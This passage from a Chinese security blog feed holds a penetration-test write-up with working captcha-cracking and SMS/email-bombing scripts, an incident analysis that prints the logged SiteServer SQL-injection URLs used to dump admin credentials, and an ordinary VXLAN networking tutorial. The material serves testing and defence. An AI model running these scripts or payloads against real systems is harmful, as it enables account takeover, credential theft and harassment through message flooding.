id="短信验证码爆破导致任意用户密码修改"><a href="#短信验证码爆破导致任意用户密码修改" class="headerlink" title="短信验证码爆破导致任意用户密码修改"></a>短信验证码爆破导致任意用户密码修改</h3>我们可以枚举用户之后，但是可以看到还需要对应的验证码才能修改密码，这里我们先简单的尝试了假设验证码是四位的情况去暴力枚举短信验证码。并没有成功爆破，很可能是六位的短信验证码，很难突破。但是在过程中发现，后台没有对验证失败次数进行限制，且短信验证码很可能没有设置有效时长，在数个小时之后重发密码修改的数据包任提示短信验证码错误。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-68049cba056bb67e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="修改密码"><br>由此可知就算是六位数的密码，只要短信验证码一直不过期，且没有失败处理策略我们任可以通过暴力枚举的方法对任意用户的密码进行重置。因此挂了双个线程，进行短信验证码暴露枚举尝试，几个小时候成功修改管理员用户密码：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-b26f20c78d4adf87.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="修改密码"><br>成功登录管理后台<br><img src="https://upload-images.jianshu.io/upload_images/6269327-fdb88d3fb8fb1431.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="登录"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>从上面的场景可以看到，就算再长的验证码，在上面的场景中一样是可以被突破的。单一的高强度的安全策略也是不能保证系统的安全的，在安全建设者的角度来说，我们需要的是建立起一个没有短板的木桶，安全策略是相互维系着的，对每一个业务/功能/系统处没有一个完整的安全策略，很容易被攻击者以点破面，打破防御。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;从用户枚举到任意用户密码修改&quot;&gt;&lt;a href=&quot;#从用户枚举到任意用
      
    
    </summary>
    
      <category term="安全测试" scheme="https://XD0ne.github.io/categories/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="安全测试" scheme="https://XD0ne.github.io/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>一次验证码安全测试</title>
    <link href="https://XD0ne.github.io/2020/11/02/38.%E4%B8%80%E6%AC%A1%E9%AA%8C%E8%AF%81%E7%A0%81%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    <id>https://XD0ne.github.io/2020/11/02/38.一次验证码安全测试/</id>
    <published>2020-11-01T17:00:00.000Z</published>
    <updated>2020-11-03T09:06:15.935Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="一次验证码安全测试"><a href="#一次验证码安全测试" class="headerlink" title="一次验证码安全测试"></a>一次验证码安全测试</h1><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近在对某产品进行安全测试时，在对登录功能模块的逻辑漏洞进行检测时，在验证码检测发现一定的安全缺陷。</p><h2 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h2><h3 id="不安全的验证码"><a href="#不安全的验证码" class="headerlink" title="不安全的验证码"></a>不安全的验证码</h3><p>在该产品的登录功能处存在忘记密码和注册子功能，这两个子功能都有发送短信验证码和手机验证码以及在图像验证码。其中图像类型验证码如下：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-cdb8ba0a03bbba06.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="验证码"><br>刷新验证码收到的<code>response</code>如下：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-981db70c105599bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="svg"><br>可知该验证码是svg验证码，该验证码号称因为是svg格式所以想要使用打码平台进行识别需要再转成图像文件格式然后在识别。但是该svg-captcha验证码项目因为其设计上的缺陷，导致其可被工具百分百识别。具体破解详情可以看该验证码项目的<a href="https://github.com/produck/svg-captcha/issues/45" target="_blank" rel="noopener">issus</a>，复现一下，十分有意思。<br>根据上面的验证码图片，简单描述就是该验证码的svg文件由5个部分组成，其中四个为验证码字符，另一个为干扰线，其中不同字符的在在svg中的长度也不同，所以可以计算svg中每部分的长度来确定其是什么字符。但是不同字体以及其他的配置会导致长度不一样，所以在不同场景下要针对性的去计算出每个字符对应的长度。</p><h4 id="验证码破解"><a href="#验证码破解" class="headerlink" title="验证码破解"></a>验证码破解</h4><p>这个图就是默认的字体，但是我在使用公开的node js<a href="https://github.com/haua/svg-captcha-recognize" target="_blank" rel="noopener">破解代码</a>代码时出现不能百分百破解的情况。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-cdb8ba0a03bbba06.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="验证码"><br>对比svg文件时发现，虽然本次产品使用的是svg的默认字体，但是在其他的配置参数并不是默认的，通过反复比较，调整参数，对比获取的验证码图片和我们生成的验证码图片如下：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-7e9b673a9f9aae7d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="对比图"><br>使用PS对比，两个图可完全重合，确保参数没有问题：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-aa3e1f7685dc757c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="PS对比"><br>找到的参数如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const cap = svgCaptcha(&apos;njsc&apos;,&#123;</span><br><span class="line">width: 100,</span><br><span class="line">height: 40,</span><br><span class="line">fontSize:50</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p>由此，我们可以按照上面的配置去生成验证码，求出字符长度和字符的对应表。<br><code>createdata.js</code>该文件就一个函数，接收四位字符串的输入，根据该输入生成指定的验证码。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getData(csvText)&#123;</span><br><span class="line">var svgCaptcha = require(&apos;svg-captcha&apos;);</span><br><span class="line">const cap = svgCaptcha(csvText,&#123;</span><br><span class="line">width: 100,</span><br><span class="line">height: 40,</span><br><span class="line">fontSize:50</span><br><span class="line">&#125;)</span><br><span class="line">//console.log(cap)</span><br><span class="line">return cap//,cap.data</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>xxx.py</code>改文件用来生成字符与长度的对应表。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import execjs</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line"># 第一部分，刷新获取验证码，从返回包中获取验证码id和验证码svg文件</span><br><span class="line">def GetCode(s):</span><br><span class="line">    with open(&quot;./creatcode.js&quot;, &apos;r&apos;, encoding =&apos;utf-8&apos;) as f:</span><br><span class="line">        content = f.read() #读取js文件的全部内容到content变量中</span><br><span class="line">    ctx = execjs.compile(content)</span><br><span class="line">    jscode = &apos;getData(&quot;&#123;&#125;&quot;)&apos;.format(s)</span><br><span class="line">    text= ctx.eval(jscode)</span><br><span class="line">    return text</span><br><span class="line"></span><br><span class="line">for i in (&apos;1234567890qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJMIKOLP&apos;):</span><br><span class="line">    flag = 4*i</span><br><span class="line">    cap_img = GetCode(flag) # 验证码svg文件</span><br><span class="line">    path_list = re.findall(&apos;&lt;path.*?/&gt;&apos;, str(cap_img))</span><br><span class="line">    for x in path_list:</span><br><span class="line">        if len(x)&gt;500:</span><br><span class="line">            with open(&quot;map.txt&quot;,&quot;a&quot;) as f:</span><br><span class="line">                f.write(str(i) + &quot; &quot; + str(len(x)) + &quot;\n&quot; )</span><br></pre></td></tr></table></figure></p><p>获得字符长度对应表之后，可能会出现不同字符长度相同的情况，这个时候可以根据其他特征去区分一下就行，比如通过获取绘制过程中最小\最大的x轴y轴的坐标来区分。例子可以看node js<a href="https://github.com/haua/svg-captcha-recognize" target="_blank" rel="noopener">破解代码</a>的方法。<br>由于svg验证码存在的设计缺陷，我们可以用计算好的对应表去破解该验证码。很多人会说可以用打码平台也可以解决这类图像验证码的问题，但是其速度肯定远远比不上这里的简单的计算，识别是毫秒级的而且不需要接入第三方、本地即可。</p><h2 id="任意手机短信-邮箱邮件轰炸"><a href="#任意手机短信-邮箱邮件轰炸" class="headerlink" title="任意手机短信/邮箱邮件轰炸"></a>任意手机短信/邮箱邮件轰炸</h2><p>因为我们测试的是登录模块的注册功能，所以很可能存在任意手机短信/邮箱邮件轰炸漏洞，只要绕过图像验证码即可。测试的逻辑过程如下：</p><ol><li>发送一个刷新验证码的包，从返回包中获取验证码id和验证码svg文件</li><li>svg文件使用公开的node js<a href="https://github.com/haua/svg-captcha-recognize" target="_blank" rel="noopener">破解代码</a>识别验证码，将其中的字符对应表换成我们自己训练的。</li><li>解密的验证码和验证码id传给发送邮件的请求包，发送请求。<br>除去已经下好的node js破解文件，把index.js换成自己的map表，自己写了两个部分，一个Python文件，主要负责进行发包收包，一个是js文件，进行验证码识别。<br><code>code.js</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function getData(csvText)&#123;   //接收Python发过来的svg文件</span><br><span class="line">csvText = csvText.replace(/\*/g,&quot;\&quot;&quot;)   //这里应该用编码来解决符合问题的</span><br><span class="line">console.log(csvText)</span><br><span class="line">const &#123; recognize &#125; = require(&apos;./index&apos;) //调用index进行验证码识别</span><br><span class="line">const text = recognize(csvText) </span><br><span class="line">return text</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><code>code.py</code><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import execjs</span><br><span class="line"></span><br><span class="line"># 第一部分，刷新获取验证码，从返回包中获取验证码id和验证码svg文件</span><br><span class="line">def GetCode():</span><br><span class="line">    while True:</span><br><span class="line">        RefreshCode = requests.get(&apos;xx.xx&apos;) </span><br><span class="line">        captcha_key = RefreshCode.json()[&quot;captcha_key&quot;]</span><br><span class="line">        captcha_img = RefreshCode.json()[&quot;captcha_img&quot;]</span><br><span class="line">        # 调用js破解验证码</span><br><span class="line">        with open(&quot;./pwc.js&quot;, &apos;r&apos;, encoding =&apos;utf-8&apos;) as f:</span><br><span class="line">            content = f.read() #读取js文件的全部内容到content变量中</span><br><span class="line">        ctx = execjs.compile(content)</span><br><span class="line">        captcha_img = captcha_img.replace(&quot;\&quot;&quot;,&quot;*&quot;)</span><br><span class="line">        jscode = &apos;getData(&quot;&#123;&#125;&quot;)&apos;.format(captcha_img)</span><br><span class="line">        captcha = ctx.eval(jscode)</span><br><span class="line">        if len(captcha) == 4:   #这里因为没有自己去计算对于长度表，所以部分识别不出来</span><br><span class="line">            break</span><br><span class="line">    return captcha_key,captcha</span><br><span class="line"></span><br><span class="line">for i in range(0,100):</span><br><span class="line">    key,code = GetCode()</span><br><span class="line">    POSTHeader = &#123;</span><br><span class="line">&quot;Pragma&quot;: &quot;no-cache&quot;,</span><br><span class="line">&quot;Cache-Control&quot;: &quot;no-cache&quot;,</span><br><span class="line">&quot;Accept&quot;: &quot;application/json, text/javascript, */*; q=0.01&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    POSTData = &#123;</span><br><span class="line">&apos;captcha_key&apos;: key,</span><br><span class="line">&apos;captcha&apos; : code,</span><br><span class="line">&apos;email&apos;: &apos;x@xx.com&apos;,</span><br><span class="line">&#125;</span><br><span class="line">    SentEmailURL = &apos;xxx&apos;</span><br><span class="line">    Cookie = &#123;&quot;Cookie&quot;:&apos;&apos;&#125;</span><br><span class="line">    SentEmil = requests.post(SentEmailURL,headers=POSTHeader,data=POSTData,cookies=Cookie)</span><br><span class="line">    print(SentEmil.text)</span><br></pre></td></tr></table></figure></p><p>测试结果如下图：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-d9e8b4ea93aebd1d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="hack"><br>收到的短信验证码：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-309dbb36ee1bd6fb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="短信"><br>经过测试，可以看到虽然会有提示请求被阻止，但还是可以继续发送短信验证码，最后测试几分钟内发送了100条短信。而邮箱验证码设置在10分钟内同一邮箱账号只发送20次，20次之前也会提示次数超过限制。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次主要是想去测一测短信轰炸的，然后顺道发现了不安全的验证码问题，两个都是验证码的逻辑漏洞，一个是图片验证码设计的缺陷，一个是短信验证码没有设置阈值以及频率。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;一次验证码安全测试&quot;&gt;&lt;a href=&quot;#一次验证码安全测试&quot; cla
      
    
    </summary>
    
      <category term="安全测试" scheme="https://XD0ne.github.io/categories/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="安全测试" scheme="https://XD0ne.github.io/tags/%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>一次服务器被传webshell事件溯源</title>
    <link href="https://XD0ne.github.io/2020/10/26/37.%E4%B8%80%E6%AC%A1%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E4%BC%A0webshell%E4%BA%8B%E4%BB%B6%E6%BA%AF%E6%BA%90/"/>
    <id>https://XD0ne.github.io/2020/10/26/37.一次服务器被传webshell事件溯源/</id>
    <published>2020-10-25T17:00:00.000Z</published>
    <updated>2020-10-26T10:48:34.498Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="一次服务器被传webshell事件溯源"><a href="#一次服务器被传webshell事件溯源" class="headerlink" title="一次服务器被传webshell事件溯源"></a>一次服务器被传webshell事件溯源</h1><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>web服务器使用SiteServer开源CMS为建站模板，该类cms属于漏洞高发区，频频会爆出高危漏洞。这次的应该是个在野0day。</p><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>阿里云安骑士告警<br><img src="https://upload-images.jianshu.io/upload_images/6269327-55a72cbb1cdde564.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="webshell告警"></p><h2 id="溯源过程"><a href="#溯源过程" class="headerlink" title="溯源过程"></a>溯源过程</h2><ol><li>可以看到阿里云安骑士报了存在服务器存在webshell，访问该链接，显示403，应该是触发了上传目录下可读可写不可执行的安全策略。我们取得了相关服务器的权限之后，在主机上进行漏洞影响范围和攻击溯源。</li><li>登上服务器首先对系统安全进行排查，查看隐藏用户以及计划人物以及登录日志，初步判断攻击者并没有通过webshell提升到系统的权限。</li><li>从服务器dump下机器最近10天的web访问记录到本地进行溯源分析。</li><li>找到攻击payload如下：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-8e8897ba86290e5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="payload"><br>三条payload分别对应获取<code>UserName</code>、<code>Password</code>、<code>PasswordSalt</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://www.xxxx.cn/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&amp;publishmentSystemId=1&amp;nodeId=1&amp;title=a%27,0)%20%3E%200%20union%20select%20TOP%202%20Username%20from%20bairong_Administrator--</span><br><span class="line">http://www.xxxx.cn/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&amp;publishmentSystemId=1&amp;nodeId=1&amp;title=a%27,0)%20%3E%200%20union%20select%20TOP%201%20Password%20from%20bairong_Administrator--%20</span><br><span class="line">http://www.xxxx.cn/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&amp;publishmentSystemId=1&amp;nodeId=1&amp;title=a%27,0)%20%3E%200%20union%20select%20TOP%202%20PasswordSalt%20from%20bairong_Administrator--</span><br></pre></td></tr></table></figure></li></ol><p>获取了管理员用户的用户名、密码密文以及密钥，解密之后可登陆管理后台。<a href="http://www.xxxx.cn/siteserver/login.aspx" target="_blank" rel="noopener">http://www.xxxx.cn/siteserver/login.aspx</a>。通过日志可以看到，攻击者在登录管理后台后成功上传了木马文件。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-b58f19d92a72c2de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="upload"><br>上传接口在后台就不展示了。简单的双写绕过文件后缀检测。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-5898c737183ff1a7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="双写绕过"><br>因为触发了之前配置的可读可写不可执行的策略，所以攻击者上传的木马访问是403，无法进一步攻击。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-abd1fbe2ed29ce0f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="403"><br>之后跟进攻击者的使用的ip以及上传木马时间节点之后的日志，并未发现有其他成功的进一步攻击事件。</p><h2 id="攻击过程概述"><a href="#攻击过程概述" class="headerlink" title="攻击过程概述"></a>攻击过程概述</h2><p>此次攻击事件攻击链由一个未授权接口的sql注入以及后台文件上传漏洞构成。以下日志分析的时间为GMT+0，国内时间应该在此基础上加8小时：</p><ul><li>2020-10-19  18:44  IP为128.14.16.23攻击者通过siteserver的一个未授权访问接口的sql注入获取了管理员用户信息。</li><li>2020-10-22 09:33  IP为198.176.51.185的攻击者通过siteserver的一个未授权访问接口的sql注入获取了管理员用户信息。这两次从请求时间间隔特征可以大致判断攻击已经自动化。</li><li>2020-10-22 09:31  IP为128.14.16.23的攻击者通过后台的文件上传漏洞上传了<code>avator.aspx</code>的网站木马文件。</li><li>2020-10-22 09:34  IP为198.176.51.185的攻击者通过后台的文件上传漏洞上传了<code>avator.aspx</code>的网站木马文件。</li><li>（北京时间）2020-10-22 17:31 阿里云安骑士预警存在webshell文件。<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2>攻击者可以获取到该站点siteserver应用管理员<br>攻击者可以访问到对应的siteserver数据库数据<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2>通过整个攻击溯源分析可知，对应的攻击链为：接口未授权访问–&gt;sql注入–&gt;文件上传突破。其中接口未授权访问是最开始的一点，要在源头切断攻击链是最高效的。因此我们通过对日志的统计，发现该接口并不常用，20天没有正常的访问记录，便临时选择关闭该接口来暂时确保安全。此次主要针对sql注入的漏洞从代码层面看一看。<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3>从日志可以看到出现问题的是<code>SiteServer/Ajax/ajaxCmsService.aspx</code>文件调用的是一个编译好的dll文件。<br><img src="https://upload-images.jianshu.io/upload_images/6269327-ac171ddbdd8061fc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="aspx"><br><img src="https://upload-images.jianshu.io/upload_images/6269327-ad58ba2336379c86.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="dll文件"><br>反编译改文件找到对应的代码块：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-70e7e71c6fe3e7d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="get请求"><br>可以看到对应的http请求的函数为<code>GetTitles</code>出现sql注入的参数是<code>title</code>，该参数没有经过任何处理直接传到了执行sql的<code>GetValueListByStartString</code>函数中，定位到该函数：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-0655f2c42280237b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="sql函数"><br><code>title</code>参数对应这的<code>startString</code>参数。该参数也是没有经过任何处理就被传入<code>GetInStr</code>函数。查看该函数：<br><img src="https://upload-images.jianshu.io/upload_images/6269327-a6e1cb7607f17457.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="GetInStr"><br>这个只是拼接一下两个参数并没有其他处理，所以回到上个执行sql的函数可以看到，参考一条注入日志，他所执行的sql语句为：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#SQL注入日志</span><br><span class="line">http://www.xxxx.cn/SiteServer/Ajax/ajaxCmsService.aspx?type=GetTitles&amp;publishmentSystemId=1&amp;nodeId=1&amp;title=a&apos;,0) &gt; 0 union select TOP 2 PasswordSalt from bairong_Administrator--</span><br><span class="line">#实际执行的SQL语句</span><br><span class="line">SELECT xxx FROM *** WHERE NodeID = 1 AND CHARINDEX(&apos;a&apos;,0) &gt; 0 union select TOP 2 PasswordSalt from bairong_Administrator-- &apos;, &apos;Title&apos;) &gt; 0</span><br></pre></td></tr></table></figure></li></ul><p>可以看到看一眼源码的话随意就可以成功注入。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>此次攻击可以看到攻击链的源头是未授权访问，对这个接口以及同文件夹下的其他几个接口进行测试可知都存在未授权访问的情况，有可能也存在注入的漏洞。对日志分析也不存在这些接口的正常业务请求，推测是给其他接口内部调用，不应该对外开放。且这次虽然被上传了webshell但是因为之前的安全策略的完备，抵御住了攻击者下一步的攻击，减少了安全事件带来的损失。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title&gt;&lt;/a&gt;&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;/h2&gt;&lt;h1 id=&quot;一次服务器被传webshell事件溯源&quot;&gt;&lt;a href=&quot;#一次服务
      
    
    </summary>
    
      <category term="攻击分析" scheme="https://XD0ne.github.io/categories/%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    
    
      <category term="攻击分析" scheme="https://XD0ne.github.io/tags/%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>OVS+Linux Vxlan组网</title>
    <link href="https://XD0ne.github.io/2020/08/05/36.OVS+Linux%20Vxlan%E7%BB%84%E7%BD%91/"/>
    <id>https://XD0ne.github.io/2020/08/05/36.OVS+Linux Vxlan组网/</id>
    <published>2020-08-04T17:00:00.000Z</published>
    <updated>2020-08-05T08:28:32.831Z</updated>
    
    <content type="html"><![CDATA[<h2 id><a href="#" class="headerlink" title></a><meta name="referrer" content="no-referrer"></h2><h1 id="OVS-Linux-Vxlan组网"><a href="#OVS-Linux-Vxlan组网" class="headerlink" title="OVS+Linux Vxlan组网"></a>OVS+Linux Vxlan组网</h1><hr><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>因为科研需要做些小实验，涉及到交换机的网口数据的镜像转发。之前疫情在家使用一台本地虚拟机搭建OVS并作为KVM宿主机，OVS搭建网桥，OVS新建虚拟机并使用指定网桥。因为KVM中的虚拟机需要更改内核并重新编译，所以过程确实很繁琐。这次学校内的“私有云”搭建好了，所以准备用OVS+Linux Vxlan组网的形式把实验重新做一遍。<br>我的实验需要将两台实验机和一台测试机，三个服务器进行组网。这里使用了三台2核4G的Centos 7.6的虚拟机</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>在前面查资料的时候发现，网上很多教程或者案例要不是两头都是Linux ip link来组网，要不就是两边都是OVS，使用OVS来组网。在我的场景里，两边都使用Linux ip link的话，不能很好地进行流量镜像转发，两头都是OVS的话虽然也可以，但是过于繁重了，所以我们的实验是一边是OVS，另一边是Linux ip link进行点对点的Vxlan组网。测试机作为虚拟交换设备承载OVS，两台实验机分别和测试机进行点对点的Vxlan组网。</p><h3 id="三台机器基础信息"><a href="#三台机器基础信息" class="headerlink" title="三台机器基础信息"></a>三台机器基础信息</h3><figure class="highlight plain"><figcaption><span>ip:10.122.0.22/16</span></figcaption><table><tr><td class="code"><pre><span class="line">```Clinet2```：eth0 ip:10.122.3.152/16</span><br><span class="line">```Test(Server)```：eth0 ip:10.122.1.103/16</span><br><span class="line">```Firewalld Status```：Stop</span><br><span class="line">三台机器的eth0网卡互通</span><br><span class="line">## 基础命令</span><br><span class="line">管理 VXLAN 接口</span><br><span class="line">Linux VXLAN 接口的基本管理如下：</span><br><span class="line">创建点对点的 VXLAN 接口：</span><br></pre></td></tr></table></figure><p>ip link add vxlan0 type vxlan id 4100 remote 10.122.1.103 local 10.122.0.22 dstport 4789 dev eth0<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">上面这条命令创建一个名字为 vxlan0，类型为 vxlan 的网络 interface，后面是 vxlan interface 需要的参数：</span><br><span class="line">```id 4100```：指定 VNI 的值，这个值可以在 1 到 2^24 之间，互联的两端的ID必须保持一致，相当于一根网线的两头</span><br><span class="line">```dstport```：vtep 通信的端口，linux 默认使用 8472（为了保持兼容，默认值一直没有更改），而 IANA 分配的端口是 4789，且OVS默认的Vxlan通信端口也是4789，所以我们这里指定了它的值为4789</span><br><span class="line">```remote 10.122.1.103```：对方 vtep 的地址，类似于点对点协议</span><br><span class="line">```local 10.122.0.22```：当前节点 vtep 要使用的 IP 地址</span><br><span class="line">```dev eth0```：当节点用于 vtep 通信的网卡设备，用来读取 IP 地址。注意这个参数和 local 参数含义是相同的，在这里写出来是为了告诉大家有两个参数存在</span><br><span class="line">创建多播模式的 VXLAN 接口：</span><br></pre></td></tr></table></figure></p><p>ip link add vxlan0 type vxlan id 4100 group 224.1.1.1 dstport 4789 dev eth0<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">多播组主要通过 ARP 泛洪来学习 MAC 地址，即在 Vxlan 子网内广播 ARP 请求，然后对应节点进行响应。group 指定多播组的地址。</span><br><span class="line">查看 VXLAN 接口详细信息：</span><br></pre></td></tr></table></figure></p><p>ip -d link show vxlan0<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">启动/关闭网卡</span><br></pre></td></tr></table></figure></p><p>ip link set vxlan0 up/down<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给指定网卡分配ip</span><br></pre></td></tr></table></figure></p><p>ip addr add 192.168.0.2/24 dev vxlan0<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">## 实验开始</span><br><span class="line">Client1和Client2分别建立一个Vxlan0的网卡，```remote address```为```Test```机器```eth0```网卡的地址```10.122.1.103```,```local adress```为本地服务器的```eth0```网卡的地址。</span><br></pre></td></tr></table></figure></p><p>#Client1<br>ip link add vxlan0 type vxlan id 4200 remote 10.122.3.152 local 10.122.1.103 dstport 4789 dev eth0</p><p>#Clinet2<br>ip link add vxlan0 type vxlan id 4300 remote 10.122.1.103 local 10.122.3.152 dstport 4789 dev eth0<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这个时候使用```ip a```命令就可以看到两个新的```vxlan0```的网卡了。</span><br><span class="line">给两个网卡配上IP并启动</span><br></pre></td></tr></table></figure></p><p>#Client1<br>ip addr add 192.168.0.2/24 dev vxlan0<br>ip link set vxlan0 up</p><p>#Client2<br>ip addr add 192.168.0.3/24 dev vxlan0<br>ip link set vxlan0 up<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">到这一步相当于两根网线的一头插在了两台虚拟机上了，接下来就需要把这两个网线的另一头都插到交换机上就可以了。可以使用```ip r```命令看看，在新建网卡的时候，路由也自动加上了。</span><br><span class="line">![Route](https://upload-images.jianshu.io/upload_images/6269327-e6180d6201286939.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)</span><br><span class="line">在```Test```服务器上新建两个```vxlan```网卡，```ID```和```remote address```分别和两台```Client```对应。</span><br></pre></td></tr></table></figure></p><p>#vxlan0 对应Client1<br>ip link add vxlan0 type vxlan id 4200 remote 10.122.0.22 local 10.122.1.103 dstport 4789 dev eth0</p><p>#vxlan1 对应Client2<br>ip link add vxlan1 type vxlan id 4300 remote 10.122.3.152 local 10.122.1.103 dstport 4789 dev eth0<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这个时候先给Test服务器上的vxlan0网卡配上IP并启动就可以了。</span><br></pre></td></tr></table></figure></p><p>ip addr add 192.168.0.4/24 dev vxlan0<br>ip link set vxlan0 up<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这个时候相当于把一根网线一头插在```Test```的网口上，另一头插在```Client1```的网卡上。看一看```Test```也自动生成了路由，可以进行```ping```命令检测点到点Vxlan是否建立成功。</span><br><span class="line">![Ping](https://upload-images.jianshu.io/upload_images/6269327-e73e9f9936cb0638.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)</span><br><span class="line">这个时候把```Test```服务器上的```vxlan1```按照相同的命令也配上```ip```，并启动，```ping```检测，发现不能```ping```通。这个时候我们看一下```Test```服务器上的路由。</span><br><span class="line">![Route](https://upload-images.jianshu.io/upload_images/6269327-4a921163352b727c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)</span><br><span class="line">可以看到，因为配的```ip```都是```192.168.0.0/24```段的，明显最后一条走```vxlan1```的路由不会生效，因为会优先匹配他前面走```vxlan0```的路由，这个时候可以选择配不同段的ip或者自己改一改路由策略。</span><br><span class="line">![IP](https://upload-images.jianshu.io/upload_images/6269327-11a1d9b9179294a5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)</span><br><span class="line">我这里给```Client2```的```vxlan0```网卡上多配一个```ip```，然后也给```Test```服务器上的```Vxlan1```网卡多配一个```ip```，即可```ping```通。</span><br><span 